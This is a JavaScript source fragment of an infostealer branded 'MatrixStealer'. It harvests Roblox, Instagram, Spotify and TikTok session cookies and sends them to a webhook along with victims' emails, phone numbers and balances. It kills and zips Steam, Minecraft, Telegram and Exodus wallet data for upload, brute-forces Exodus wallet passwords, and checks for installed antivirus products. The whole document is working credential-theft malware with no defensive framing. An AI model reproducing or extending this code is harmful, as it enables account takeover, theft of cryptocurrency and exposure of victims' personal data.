                                cookies.push(cookie);
                            }
                        } else if (!cookieName && parts[5]) {
                            const cookie = parts[6];
                            if (cookie && !cookies.includes(cookie)) {
                                cookies.push(cookie);
                            }
                        }
                    }
                }
            } catch (err) { }
        });
    } catch (err) { }
    return cookies;
}

function getAllFiles(dir, ext) {
    const files = [];
    try {
        const items = fs.readdirSync(dir);
        for (const item of items) {
            const fullPath = path.join(dir, item);
            const stat = fs.statSync(fullPath);
            if (stat.isDirectory()) {
                files.push(...getAllFiles(fullPath, ext));
            } else if (stat.isFile() && (!ext || item.endsWith(ext))) {
                files.push(fullPath);
            }
        }
    } catch (err) { }
    return files;
}

async function FindRoblox(cookie) {
    const headers = {
        Cookie: `.ROBLOSECURITY=${cookie}`,
        'User-Agent': 'Roblox/WinInet'
    };

    try {
        const resp = await axios.get('https://users.roblox.com/v1/users/authenticated', { headers });
        if (!resp?.data) return null;

        let robux = 0;
        try {
            const balance = await axios.get('https://economy.roblox.com/v1/user/currency', { headers });
            robux = balance?.data?.robux || 0;
        } catch {
            console.log('[ROBLOX] Could not get Robux balance');
        }

        return {
            id: resp.data.id,
            username: resp.data.name,
            displayName: resp.data.displayName,
            robux
        };
    } catch (err) {
        console.log('[ROBLOX] Request failed:', err.response?.status || err.message);
        return null;
    }
}

async function embedRoblox(cookie) {
    const data = await FindRoblox(cookie);
    if (!data) {
        console.log('[ROBLOX] No valid data found for cookie');
        return;
    }

    const payload = {
        username: 'MatrixStealer',
        avatar_url: 'https://i.imgur.com/okbNKaT.png',
        embeds: [{
            author: {
                name: 'MatrixStealer (Roblox Session)',
                icon_url: 'https://i.imgur.com/okbNKaT.png'
            },
            description: `\`\`\`${cookie}\`\`\``,
            fields: [{
                name: '<:auth:1316345705341911063> Roblox Info',
                value:
                    `>  **Username**: \`${data.username}\`\n` +
                    `> **Display Name**: \`${data.displayName}\`\n` +
                    `> **User ID**: \`${data.id}\`\n` +
                    `> **Robux**: \`${data.robux}\`\n` +
                    `> **Profile**: [Open Profile](https://www.roblox.com/users/${data.id}/profile)`,
                inline: false
            }],
            color: 9498256,
            footer: { text: `MatrixStealer | Hardware Authenticated` }
        }]
    };

    try {
        await sendLog(payload);
        console.log(`[ROBLOX] Sent to webhook: ${data.username} | Robux: ${data.robux}`);
    } catch (err) {
        console.log('[ROBLOX] Failed to send webhook:', err.response?.data || err.message);
    }
}

async function collectRobloxSessions(outputDir) {
    console.log('[ROBLOX] Scanning cookies in output directory:', outputDir);
    const cookies = readCookiesFromOutput(outputDir, '.ROBLOSECURITY');
    console.log(`[ROBLOX] Total cookies found: ${cookies.length}`);

    for (const cookie of cookies) {
        await embedRoblox(cookie);
    }
}

async function FindInstagram(cookie) {
    const headers = {
        Host: 'i.instagram.com',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Accept-Encoding': 'gzip, deflate',
        'User-Agent': 'Instagram 275.0.0.27.98 Android (30/11; 420dpi; 1080x1920; Xiaomi; Redmi Note 7; violet; qcom; en_US; 440914592)',
        Cookie: `sessionid=${cookie};`
    };

    let data = {};

    try {
        let response = await axios.get('https://i.instagram.com/api/v1/accounts/current_user/?edit=true', { headers, timeout: 6000 });
        if (response?.data?.user) {
            const user = response.data.user;
            data.username = user.username;
            data.verified = user.is_verified;
            data.avatar = user.profile_pic_url;
            data.sessionid = cookie;
            data.id = user.pk_id;
            data.number = user.phone_number || 'None';
            data.mail = user.email || 'None';
            data.name = user.full_name || 'None';
            data.bio = user.biography || 'None';

            const response2 = await axios.get(`https://i.instagram.com/api/v1/users/${data.id}/info`, { headers });
            if (response2?.data?.user) {
                data.followers = response2.data.user.follower_count || 0;
                data.follows = response2.data.user.following_count || 0;
            } else {
                data.followers = 0;
                data.follows = 0;
            }
        } else {
            response = await axios.get('https://i.instagram.com/api/v1/accounts/current_user/', { headers, timeout: 6000 });
            if (response?.data?.user) {
                const user = response.data.user;
                data.username = user.username;
                data.verified = user.is_verified;
                data.avatar = user.profile_pic_url;
                data.sessionid = cookie;
                data.id = user.pk_id;
                data.number = user.phone_number || 'None';
                data.mail = user.email || 'None';
                data.name = user.full_name || 'None';
                data.bio = user.biography || 'None';

                const response2 = await axios.get(`https://i.instagram.com/api/v1/users/${data.id}/info`, { headers, timeout: 6000 });
                if (response2?.data?.user) {
                    data.followers = response2.data.user.follower_count || 0;
                    data.follows = response2.data.user.following_count || 0;
                } else {
                    data.followers = 0;
                    data.follows = 0;
                }
            }
        }
    } catch (err) {
        if (err.response?.status === 403) {
            return data;
        } else {
            console.log('[INSTAGRAM] Error:', err.message);
        }
    }

    return data;
}

const processedInstagramUsers = new Set();

async function sendInstagramEmbed(data) {
    if (!data.username) return;

    const payload = {
        username: 'MatrixStealer',
        avatar_url: 'https://i.imgur.com/okbNKaT.png',
        embeds: [{
            author: {
                name: 'MatrixStealer (Instagram Session)',
                icon_url: 'https://i.imgur.com/okbNKaT.png'
            },
            fields: [
                { name: 'Cookie:', value: `\`\`\`${data.sessionid}\`\`\``, inline: false },
                { name: 'Username:', value: `\`${data.username || 'None'}\``, inline: true },
                { name: 'Name:', value: `\`${data.name || 'None'}\``, inline: true },
                { name: 'Email:', value: `\`${data.mail || 'None'}\``, inline: true },
                { name: 'Phone Number:', value: `\`${data.number || 'None'}\``, inline: true },
                { name: 'Follower Count:', value: `\`${data.followers || 0}\``, inline: true },
                { name: 'Follows Count:', value: `\`${data.follows || 0}\``, inline: true },
                { name: 'Verified:', value: `\`${data.verified ? 'Yes' : 'No'}\``, inline: true }
            ],
            thumbnail: { url: data.avatar },
            color: 9498256,
            footer: { text: `MatrixStealer | Hardware Authenticated` }
        }]
    };

    try {
        await sendLog(payload);
        console.log('[INSTAGRAM] Sent:', data.username);
    } catch (err) {
        console.log('[INSTAGRAM] Webhook error:', err.message);
    }
}

async function collectInstagramSessions(outputDir) {
    console.log('[INSTAGRAM] Scanning cookies in output directory:', outputDir);
    const cookies = readCookiesFromOutput(outputDir, 'sessionid');
    console.log(`[INSTAGRAM] Total cookies found: ${cookies.length}`);

    const uniqueCookies = [...new Set(cookies)];
    console.log(`[INSTAGRAM] Unique cookies: ${uniqueCookies.length}`);

    let successCount = 0;
    for (let i = 0; i < uniqueCookies.length; i++) {
        const cookie = uniqueCookies[i];
        try {
            const data = await FindInstagram(cookie);
            if (!data || !data.username) {
                continue;
            }

            if (processedInstagramUsers.has(data.username)) {
                console.log('[INSTAGRAM] Skipping duplicate user:', data.username);
                continue;
            }

            processedInstagramUsers.add(data.username);
            await sendInstagramEmbed(data);
            successCount++;
        } catch (err) {
            console.log(`[INSTAGRAM] Error processing cookie: ${err.message}`);
        }
    }
    console.log(`[INSTAGRAM] Successfully sent ${successCount} unique accounts`);
}

async function collectSpotifySessions(outputDir) {
    try {
        console.log('[SPOTIFY] Scanning cookies in output directory:', outputDir);
        const cookies = readCookiesFromOutput(outputDir, 'sp_dc');
        console.log(`[SPOTIFY] Total cookies found: ${cookies.length}`);

        for (const cookie of cookies) {
            await sendSpotifyEmbed(cookie);
        }
    } catch (err) {
        console.error('[SPOTIFY] Error:', err.message);
    }
}

async function sendSpotifyEmbed(sp_dc) {
    const headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36',
        Cookie: `sp_dc=${sp_dc}`
    };

    const response = await axios.get('https://www.spotify.com/api/account-settings/v1/profile', { headers }).catch(() => null);

    if (!response || !response.data || !response.data.profile) {
        console.log('[SPOTIFY] Invalid or expired cookie');
        return;
    }

    const profile = response.data.profile;
    const email = profile.email || 'Not available';
    const birthdate = profile.birthdate || 'Not available';
    const country = profile.country || 'Not available';
    const usernameStr = profile.username || 'Username not available';
    const profileUrl = profile.username ? `[Click here](https://open.spotify.com/user/${profile.username})` : 'Username not available';

    let accountData = {};
    try {
        const accountResponse = await axios.get('https://www.spotify.com/at/api/account/v1/datalayer/', { headers });
        if (accountResponse?.data) {
            accountData = accountResponse.data;
        }
    } catch (err) {
        console.log('[SPOTIFY] Could not fetch account data');
    }

    const isTrialUser = accountData.isTrialUser !== undefined ? accountData.isTrialUser : 'Unknown';
    const currentPlan = accountData.currentPlan || 'Unknown';
    const isRecurring = accountData.isRecurring !== undefined ? accountData.isRecurring : 'Unknown';
    const daysLeft = accountData.daysLeft !== undefined ? accountData.daysLeft : 'Unknown';
    const accountAgeDays = accountData.accountAgeDays !== undefined ? accountData.accountAgeDays : 'Unknown';
    const isSubAccount = accountData.isSubAccount !== undefined ? accountData.isSubAccount : 'Unknown';
    const accountCountry = accountData.country || country;
    const nextBillingInfo = accountData.nextBillingInfo || {};
    const billingValue = nextBillingInfo.value || 'Unknown';
    const isTaxIncluded = nextBillingInfo.isTaxIncluded !== undefined ? nextBillingInfo.isTaxIncluded : 'Unknown';
    const expiry = accountData.expiry || 'Unknown';

    const isPremium = currentPlan && currentPlan !== 'free';

    const fields = [
        { name: 'Cookie:', value: `\`\`\`${sp_dc}\`\`\``, inline: false },
        { name: 'Profile Url:', value: profileUrl, inline: true },
        { name: 'Email:', value: `\`${email}\``, inline: true },
        { name: 'Username:', value: `\`${usernameStr}\``, inline: true },
        { name: 'Country:', value: `\`${accountCountry}\``, inline: true }
    ];

    if (isPremium) {
        fields.push(
            { name: 'Current Plan:', value: `\`${currentPlan}\``, inline: true },
            { name: 'Recurring:', value: `\`${isRecurring}\``, inline: true },
            { name: 'Days Left:', value: `\`${daysLeft}\``, inline: true },
            { name: 'Account Age (Days):', value: `\`${accountAgeDays}\``, inline: true },
            { name: 'Sub Account:', value: `\`${isSubAccount}\``, inline: true },
            { name: 'Expiry:', value: `\`${expiry}\``, inline: true }
        );
    }

    const embed = {
        author: {
            name: 'MatrixStealer (Spotify Session)',
            icon_url: 'https://i.imgur.com/okbNKaT.png'
        },
        thumbnail: { url: 'https://i.imgur.com/okbNKaT.png' },
        fields: fields,
        color: 9498256,
        footer: { text: `MatrixStealer | Hardware Authenticated` }
    };

    const payload = {
        username: 'MatrixStealer',
        avatar_url: 'https://i.imgur.com/okbNKaT.png',
        embeds: [embed]
    };

    await sendLog(payload);
    console.log('[SPOTIFY] Sent:', usernameStr);
}

async function collectSteamSession() {
    console.log('[*] Starting Steam session collection...');

    try {
        try {
            execSync('taskkill /IM Steam.exe /F', { stdio: 'ignore' });
        } catch (e) { }

        const steamPath = 'C:\\Program Files (x86)\\Steam\\config';

        if (!fs.existsSync(steamPath)) {
            console.log('[STEAM] Steam config not found');
            return;
        }

        const zipper = new AdmZip();
        zipper.addLocalFolder(steamPath);
        const temp = os.tmpdir();
        const target = path.join(temp, 'steam_session.zip');
        zipper.writeZip(target);

        const link = await zipAndUpload(target);

        if (!link) {
            console.log('[STEAM] Failed to upload file');
            fs.unlinkSync(target);
            return;
        }

        const loginFile = 'C:\\Program Files (x86)\\Steam\\config\\loginusers.vdf';
        if (!fs.existsSync(loginFile)) {
            console.log('[STEAM] loginusers.vdf not found');
            fs.unlinkSync(target);
            return;
        }

        const accounts = fs.readFileSync(loginFile, 'utf-8');
        const ids = accounts.match(/7656[0-9]{13}/g) || [];

        console.log(`[STEAM] Found ${ids.length} Steam accounts`);

        for (const account of ids) {
            try {
                const { data: { response: info } } = await axios.get(`https://api.steampowered.com/ISteamUser/GetPlayerSummaries/v0002/?key=440D7F4D810EF9298D25EDDF37C1F902&steamids=${account}`);
                const { data: { response: games } } = await axios.get(`https://api.steampowered.com/IPlayerService/GetOwnedGames/v1/?key=440D7F4D810EF9298D25EDDF37C1F902&steamid=${account}`);
                const { data: { response: level } } = await axios.get(`https://api.steampowered.com/IPlayerService/GetSteamLevel/v1/?key=440D7F4D810EF9298D25EDDF37C1F902&steamid=${account}`);

                const content = `\`${info.players[0].personaname}\` - \`${os.hostname()}\``;

                const payload = {
                    content: content,
                    username: 'MatrixStealer',
                    avatar_url: 'https://i.imgur.com/okbNKaT.png',
                    embeds: [{
                        author: {
                            name: 'MatrixStealer (Steam Session)',
                            icon_url: 'https://i.imgur.com/okbNKaT.png'
                        },
                        description: `🤺 Profile: [Click here to profile!](${info.players[0].profileurl})\n🔍 Download: [Click here to download!](${link})`,
                        fields: [{
                            name: '<:auth:1316345705341911063> Steam Info',
                            value:
                                `> **Username**: \`${info.players[0].personaname}\`\n` +
                                `> **Steam ID**: \`${account}\`\n` +
                                `> **Level**: \`${level.player_level || 'Private'}\`\n` +
                                `> **Games**: \`${games.game_count || 'Private'}\`\n` +
                                `> **Created**: <t:${info.players[0].timecreated}:F>`,
                            inline: false
                        }],
                        color: 9498256,
                        footer: { text: `MatrixStealer | Hardware Authenticated` },
                        thumbnail: { url: info.players[0].avatarfull }
                    }]
                };

                await sendLog(payload);
                console.log('[STEAM] Sent webhook for:', info.players[0].personaname);
            } catch (err) {
                console.log('[STEAM] Error processing account:', err.message);
            }
        }

        fs.unlinkSync(target);
    } catch (err) {
        console.log('[STEAM] General error:', err.message);
    }
}

const appdata = process.env.APPDATA || path.join(os.homedir(), 'AppData', 'Roaming');

function getMinecraftUserData() {
    const usercache = path.join(appdata, '.minecraft', 'usercache.json');
    let userdata = [];
    if (fs.existsSync(usercache)) {
        try {
            const data = fs.readFileSync(usercache, 'utf-8');
            userdata = JSON.parse(data);
        } catch (e) { }
    }
    return userdata;
}

async function copyFolder(src, dest) {
    if (!fs.existsSync(src)) return;

    fs.mkdirSync(dest, { recursive: true });
    const files = fs.readdirSync(src);

    for (const file of files) {
        const srcPath = path.join(src, file);
        const destPath = path.join(dest, file);

        try {
            const stat = fs.statSync(srcPath);
            if (stat.isDirectory()) {
                await copyFolder(srcPath, destPath);
            } else {
                fs.copyFileSync(srcPath, destPath);
            }
        } catch (e) { }
    }
}

async function collectMinecraftSession() {
    console.log('[*] Starting Minecraft session collection...');

    try {
        try {
            execSync('taskkill /IM javaw.exe /F', { stdio: 'ignore' });
        } catch (e) { }

        const home = os.homedir();
        const minecraft = path.join(appdata, '.minecraft');
        const lunar = path.join(home, '.lunarclient');
        const profiles = path.join(minecraft, 'launcher_profiles.json');
        const accounts = path.join(lunar, 'settings', 'game', 'accounts.json');

        const check = [profiles, accounts];
        const files = check.filter(file => fs.existsSync(file));

        if (files.length === 0) {
            console.log('[MINECRAFT] No session files found');
            return;
        }

        console.log(`[MINECRAFT] Found ${files.length} session files`);

        const temp = path.join(os.tmpdir(), `minecraft-${Date.now()}`);
        const tempmine = path.join(temp, 'minecraft');
        fs.mkdirSync(tempmine, { recursive: true });

        for (const file of files) {
            const destination = path.join(tempmine, path.basename(file));
            fs.mkdirSync(path.dirname(destination), { recursive: true });
            fs.copyFileSync(file, destination);
        }

        const lunarsettings = path.join(lunar, 'settings');
        const targetsettings = path.join(temp, 'lunarclient', 'settings');

        if (fs.existsSync(lunarsettings)) {
            await copyFolder(lunarsettings, targetsettings);
        }

        const zipper = new AdmZip();
        zipper.addLocalFolder(temp);
        const target = path.join(os.tmpdir(), 'minecraft_session.zip');
        zipper.writeZip(target);

        const link = await zipAndUpload(target);

        if (!link) {
            console.log('[MINECRAFT] Failed to upload file');
            fs.rmSync(temp, { recursive: true, force: true });
            fs.unlinkSync(target);
            return;
        }

        const user = getMinecraftUserData();
        const fields = [
            {
                name: '<:auth:1316345705341911063> How to Use:',
                value: '>>> Download the file.\nNavigate to your Minecraft or Lunar Client folder.\nReplace the existing files with the ones in the ZIP.',
                inline: false
            }
        ];

        if (user.length > 0) {
            user.forEach(user => {
                const { name, uuid, expiresOn } = user;
                const profile = `https://namemc.com/search?q=${uuid}`;
                const image = `https://mc-heads.net/skin/${uuid}`;
                let timestamp = null;

                try {
                    timestamp = Math.floor(new Date(expiresOn).getTime() / 1000);
                } catch (e) { }

                let value = `>>> **Player:** \`${name}\`\n` +
                    `**UUID:** \`${uuid}\``;

                if (timestamp) {
                    value += `\n **Expires:** <t:${timestamp}:F>`;
                }

                value += `\n **Profile:** [Click here to profile!](${profile})` +
                    `\n **Skin:** [Click here to skin!](${image})`;

                fields.push({
                    name: 'Informations',
                    value: value,
                    inline: false
                });
            });
        }

        const embed = {
            author: {
                name: 'MatrixStealer (Minecraft Session)',
                icon_url: 'https://i.imgur.com/okbNKaT.png'
            },
            description: `🔍 Download: [Click here to download!](${link})`,
            fields: fields,
            color: 9498256,
            footer: { text: `Stealcat Stealer | t.me/stealcatx` },
            thumbnail: { url: 'https://i.pinimg.com/736x/33/ee/f5/33eef535b2ffa74da6a14c01834f2932.jpg' }
        };

        const content = `${os.userInfo().username} - ${os.hostname()}`;
        const payload = {
            content: content,
            username: 'MatrixStealer',
            avatar_url: 'https://i.imgur.com/okbNKaT.png',
            embeds: [embed]
        };

        await sendLog(payload);
        console.log('[MINECRAFT] Session sent to webhook');

        fs.rmSync(temp, { recursive: true, force: true });
        fs.unlinkSync(target);
    } catch (err) {
        console.log('[MINECRAFT] General error:', err.message);
    }
}

// TELEGRAM SESSION FUNCTIONS
function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

function zipTelegram(src, destZipPath) {
    return new Promise((resolve, reject) => {
        const timeoutId = setTimeout(() => {
            console.log('[TELEGRAM] Zip timeout after 25s');
            reject(new Error('Zip operation timeout'));
        }, 25000);

        const output = fs.createWriteStream(destZipPath);
        const archive = archiver('zip', {
            zlib: { level: 5 }
        });

        output.on('close', () => {
            clearTimeout(timeoutId);
            console.log('[TELEGRAM] ZIP finalized. Size:', archive.pointer(), 'bytes');
            resolve();
        });

        output.on('error', err => {
            clearTimeout(timeoutId);
            console.log('[TELEGRAM] Output stream error:', err.message);
            reject(err);
        });

        archive.on('error', err => {
            clearTimeout(timeoutId);
            console.log('[TELEGRAM] Zip error:', err.message);
            reject(err);
        });

        archive.on('warning', err => {
            if (err.code !== 'ENOENT') {
                console.log('[TELEGRAM] Zip warning:', err.message);
            }
        });

        archive.pipe(output);
        archive.directory(src, 'tdata');
        archive.finalize();
    });
}

async function collectTelegramSession() {
    console.log('[TELEGRAM] Starting Telegram session collection...');

    try {
        console.log('[TELEGRAM] Closing Telegram process...');
        try {
            execSync('taskkill /IM Telegram.exe /F', { stdio: 'ignore' });
            console.log('[TELEGRAM] Telegram closed');
        } catch {
            console.log('[TELEGRAM] Telegram not running');
        }

        const tdataPath = path.join(appdata, 'Telegram Desktop', 'tdata');
        const zipTarget = path.join(localappdata, 'telegram_session.zip');

        if (!fs.existsSync(tdataPath)) {
            console.log('[TELEGRAM] tdata folder not found');
            return;
        }

        console.log('[TELEGRAM] Compressing tdata folder...');
        try {
            await zipTelegram(tdataPath, zipTarget);
        } catch (zipErr) {
            console.log('[TELEGRAM] Compression failed:', zipErr.message);
            if (fs.existsSync(zipTarget)) {
                try { fs.unlinkSync(zipTarget); } catch { }
            }
            throw zipErr;
        }

        console.log('[TELEGRAM] Uploading ZIP file...');
        const link = await zipAndUpload(zipTarget);

        if (!link) {
            console.log('[TELEGRAM] Upload failed');
            fs.unlinkSync(zipTarget);
            return;
        }

        console.log('[TELEGRAM] Upload complete. Link:', link);

        const embed = {
            author: {
                name: 'MatrixStealer (Telegram Session)',
                icon_url: 'https://i.imgur.com/okbNKaT.png'
            },
            description: `Download: [Click here to download!](${link})`,
            color: 9498256,
            footer: { text: `MatrixStealer | Hardware Authenticated` },
            thumbnail: { url: 'https://i.pinimg.com/736x/b7/9e/03/b79e039ff0fcce5cbf61708afed57bb2.jpg' }
        };

        const payload = {
            username: 'MatrixStealer',
            avatar_url: 'https://i.imgur.com/okbNKaT.png',
            embeds: [embed]
        };

        await sendLog(payload);
        console.log('[TELEGRAM] Embed sent successfully');

        console.log('[TELEGRAM] Removing temp ZIP...');
        fs.unlinkSync(zipTarget);
        console.log('[TELEGRAM] Cleanup complete');
    } catch (err) {
        console.log('[TELEGRAM] Error:', err.message);
    }
}

// TIKTOK SESSION FUNCTIONS
const processedCookies = [];

async function sendTikTokEmbed(secret_cookie) {
    if (processedCookies.includes(secret_cookie)) return;
    processedCookies.push(secret_cookie);

    const headers = {
        accept: 'application/json, text/plain, */*',
        'accept-encoding': 'gzip, compress, deflate, br',
        cookie: `sessionid=${secret_cookie}`
    };

    try {
        const account = await axios.get('https://www.tiktok.com/passport/web/account/info/?aid=1459&app_language=de-DE&app_name=tiktok_web&battery_info=1&browser_language=de-DE&browser_name=Mozilla&browser_online=true&browser_platform=Win32&browser_version=5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F112.0.0.0%20Safari%2F537.36&channel=tiktok_web&cookie_enabled=true&device_platform=web_pc&focus_state=true&from_page=fyp&history_len=2&is_fullscreen=false&is_page_visible=true&os=windows&priority_region=DE&referer=&region=DE&screen_height=1080&screen_width=1920&tz_name=Europe%2FBerlin&webcast_language=de-DE', { headers });

        if (!account?.data?.data?.username) return;

        const insights = await axios.post('https://api.tiktok.com/aweme/v1/data/insighs/?tz_offset=7200&aid=1233&carrier_region=DE',
            'type_requests=[{\'insigh_type\':\'vv_history\',\'days\':16},{\'insigh_type\':\'pv_history\',\'days\':16},{\'insigh_type\':\'like_history\',\'days\':16},{\'insigh_type\':\'comment_history\',\'days\':16},{\'insigh_type\':\'share_history\',\'days\':16},{\'insigh_type\':\'user_info\'},{\'insigh_type\':\'follower_num_history\',\'days\':17},{\'insigh_type\':\'follower_num\'},{\'insigh_type\':\'week_new_videos\',\'days\':7},{\'insigh_type\':\'week_incr_video_num\'},{\'insigh_type\':\'self_rooms\',\'days\':28},{\'insigh_type\':\'user_live_cnt_history\',\'days\':58},{\'insigh_type\':\'room_info\'}]',
            { headers: { cookie: `sessionid=${secret_cookie}` } });

        const wallet = await axios.get('https://webcast.tiktok.com/webcast/wallet_api/diamond_buy/permission/?aid=1988&app_language=de-DE&app_name=tiktok_web&battery_info=1&browser_language=de-DE&browser_name=Mozilla&browser_online=true&browser_platform=Win32&browser_version=5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F112.0.0.0%20Safari%2F537.36&channel=tiktok_web&cookie_enabled=true',
            { headers: { cookie: `sessionid=${secret_cookie}` } });

        const payload = {
            username: 'MatrixStealer',
            avatar_url: 'https://i.imgur.com/okbNKaT.png',
            embeds: [{
                author: {
                    name: 'MatrixStealer (TikTok Session)',
                    icon_url: 'https://i.imgur.com/okbNKaT.png'
                },
                fields: [
                    { name: 'Cookie:', value: `\`\`\`${secret_cookie || 'Not found'}\`\`\``, inline: false },
                    { name: 'Profile Url:', value: account.data.data.username ? `[Click here](https://tiktok.com/@${account.data.data.username})` : 'Username not available', inline: true },
                    { name: 'ID:', value: `\`${account.data.data.user_id_str || 'Not available'}\``, inline: true },
                    { name: 'Email:', value: `\`${account.data.data.email || 'None'}\``, inline: true },
                    { name: 'Username:', value: `\`${account.data.data.username || 'Username not available'}\``, inline: true },
                    { name: 'Followers Count:', value: `\`${insights?.data?.follower_num?.value || 'Not available'}\``, inline: true },
                    { name: 'Coins:', value: `\`${wallet?.data?.data?.coins || '0'}\``, inline: true }
                ],
                thumbnail: { url: account.data.data.avatar_url },
                color: 9498256,
                footer: { text: `MatrixStealer | Hardware Authenticated` }
            }]
        };

        await sendLog(payload);
        console.log('[TIKTOK] Sent:', account.data.data.username);
    } catch (err) {
        console.log('[TIKTOK] Error:', err.message);
    }
}

// EXODUS SESSION FUNCTIONS
function copyFolderRecursive(src, dst) {
    if (!fs.existsSync(dst)) {
        fs.mkdirSync(dst, { recursive: true });
    }

    const entries = fs.readdirSync(src, { withFileTypes: true });
    for (const entry of entries) {
        const srcPath = path.join(src, entry.name);
        const dstPath = path.join(dst, entry.name);

        if (entry.isFile()) {
            fs.copyFileSync(srcPath, dstPath);
        } else if (entry.isDirectory()) {
            copyFolderRecursive(srcPath, dstPath);
        }
    }
}

function zipDirectory(source, out) {
    const zipper = new AdmZip();
    zipper.addLocalFolder(source);
    zipper.writeZip(out);
}

function bruteForcePasswords() {
    const passwords = [
        '',
        'password',
        '123456',
        '12345678',
        'qwerty',
        'abc123',
        'letmein',
        'welcome',
        'monkey',
        'dragon',
        'master',
        'sunshine',
        'princess',
        'football',
        'iloveyou',
        'admin',
        'root'
    ];
    return passwords;
}

function decryptSeco(content, password) {
    try {
        const key = crypto.pbkdf2Sync(password, 'exodus', 10000, 32, 'sha512');
        const decipher = crypto.createDecipheriv('aes-256-gcm', key, content.slice(0, 12));
        const authTag = content.slice(-16);
        decipher.setAuthTag(authTag);
        const decrypted = Buffer.concat([
            decipher.update(content.slice(12, -16)),
            decipher.final()
        ]);
        return decrypted.toString('utf8');
    } catch (e) {
        return null;
    }
}

async function collectExodusSession() {
    try {
        console.log('[*] Starting Exodus session collection...');

        exec('taskkill /IM Exodus.exe /F', (error) => {
            // Ignore errors
        });

        const exodus = path.join(appdata, 'Exodus', 'exodus.wallet');
        const seed = path.join(exodus, 'seed.seco');

        if (!fs.existsSync(seed)) {
            console.log('[EXODUS] No seed file found');
            return;
        }

        console.log('[EXODUS] Exodus wallet found');

        const tempDir = path.join(os.tmpdir(), `exodus-${Date.now()}`);
        fs.mkdirSync(tempDir, { recursive: true });

        const targetWallet = path.join(tempDir, 'exodus.wallet');
        fs.mkdirSync(targetWallet, { recursive: true });
        copyFolderRecursive(exodus, targetWallet);

        const zipPath = path.join(os.tmpdir(), 'exodus_session.zip');
        zipDirectory(tempDir, zipPath);
        console.log('[EXODUS] Created ZIP');

        const content = fs.readFileSync(seed);

        const passwords = bruteForcePasswords();
        let found = null;
        let decrypted = null;

        for (let password of passwords) {
            decrypted = decryptSeco(content, password);
            if (decrypted) {
                found = password;
                console.log(`[EXODUS] Found password: '${password}'`);
                break;
            }
        }

        const link = await zipAndUpload(zipPath);

        if (link) {
            let fields = [
                {
                    name: '<:auth:1316345705341911063> How to Use:',
                    value: '>>> Download the file.\nNavigate to `%appdata%\\Exodus`.\nReplace the existing `exodus.wallet` folder with the one in the ZIP.\nOpen Exodus and try to access the wallet.',
                    inline: false
                }
            ];

            if (found !== null) {
                const pwdDisplay = found === '' ? 'No Password' : found;
                fields.push({
                    name: '<:White79:1259127389850566759> Password Found',
                    value: `>>> 🔑 **Password:** \`${pwdDisplay}\``,
                    inline: false
                });
            } else {
                fields.push({
                    name: '<:password:1346711994072612955> Password:',
                    value: '>>> ⚠️ **Password could not be found** (Wallet may be encrypted with custom password)',
                    inline: false
                });
            }

            const embed = {
                author: {
                    name: 'MatrixStealer (Exodus Session)',
                    icon_url: 'https://i.imgur.com/okbNKaT.png'
                },
                description: `🔍 Download: [Click here to download!](${link})`,
                fields: fields,
                color: 9498256,
                footer: { text: `MatrixStealer | Hardware Authenticated` },
                thumbnail: { url: 'https://i.imgur.com/okbNKaT.png' }
            };

            const payload = {
                content: `\`${os.userInfo().username}\` - \`${os.hostname()}\``,
                username: 'MatrixStealer',
                avatar_url: 'https://i.imgur.com/okbNKaT.png',
                embeds: [embed]
            };

            await sendLog(payload);
            console.log('[EXODUS] Session sent to webhook');
        }

        fs.rmSync(tempDir, { recursive: true, force: true });
        fs.unlinkSync(zipPath);
    } catch (err) {
        console.log('[EXODUS] Error:', err.message);
    }
}

// ========================================
// SYSTEM COLLECTOR FUNCTIONS
// ========================================

function listBrowserFolders(deepFolder) {
    const wanted = ['output'];
    const found = [];

    const searchPaths = [
        deepFolder,
        process.cwd(),
        path.join(process.cwd(), 'output')
    ];

    for (const searchPath of searchPaths) {
        if (!fs.existsSync(searchPath)) {
            continue;
        }

        try {
            const entries = fs.readdirSync(searchPath, { withFileTypes: true });

            for (const e of entries) {
                if (!e.isDirectory()) continue;
                const n = e.name.toLowerCase();

                if (wanted.includes(n)) {
                    const fullPath = path.join(searchPath, e.name);
                    if (!found.includes(fullPath)) {
                        found.push(fullPath);
                    }
                }
            }
        } catch (e) {
        }
    }

    return found;
}

async function detectAntivirusAsync() {
    const detected = [];

    const avPaths = [
        'C:\\Program Files\\Avast Software',
        'C:\\Program Files\\McAfee',
        'C:\\Program Files\\Norton',
        'C:\\Program Files\\Kaspersky Lab',
        'C:\\Program Files\\BitDefender',
        'C:\\Program Files\\ESET',
        'C:\\Program Files\\AVG',
        'C:\\Program Files\\Malwarebytes',
        'C:\\Program Files\\Sophos',
        'C:\\Program Files (x86)\\Avast Software',
        'C:\\Program Files (x86)\\McAfee',
        'C:\\Program Files (x86)\\Norton',
        'C:\\Program Files (x86)\\Kaspersky Lab',
        'C:\\Program Files (x86)\\BitDefender',
        'C:\\Program Files (x86)\\ESET',
        'C:\\Program Files (x86)\\AVG',
        'C:\\Program Files (x86)\\Malwarebytes',
        'C:\\Program Files (x86)\\Sophos'
    ];

    for (const p of avPaths) {
        if (fs.existsSync(p)) {
            const avName = p.includes('Avast') ? 'Avast' :
                p.includes('McAfee') ? 'McAfee' :
                    p.includes('Norton') ? 'Norton' :
                        p.includes('Kaspersky') ? 'Kaspersky' :
                            p.includes('BitDefender') ? 'BitDefender' :
                                p.includes('ESET') ? 'ESET' :
                                    p.includes('AVG') ? 'AVG' :
                                        p.includes('Malwarebytes') ? 'Malwarebytes' :
                                            p.includes('Sophos') ? 'Sophos' : 'Unknown AV';
            detected.push(avName);
        }
    }

    const avList = [
        { name: 'Avast', processes: ['AvastSvc.exe', 'AvastUI.exe', 'avast.exe', 'aswEngSrv.exe', 'aswToolsSvc.exe'] },
        { name: 'McAfee', processes: ['McAfeeTray.exe', 'McAfeeUI.exe', 'mcafee.exe', 'mcshield.exe', 'mfeann.exe', 'mfemms.exe', 'mfetp.exe'] },
        { name: 'Norton', processes: ['NortonSecurity.exe', 'Norton.exe', 'norton.exe', 'ccSvcHst.exe', 'ccSvcHst.exe'] },
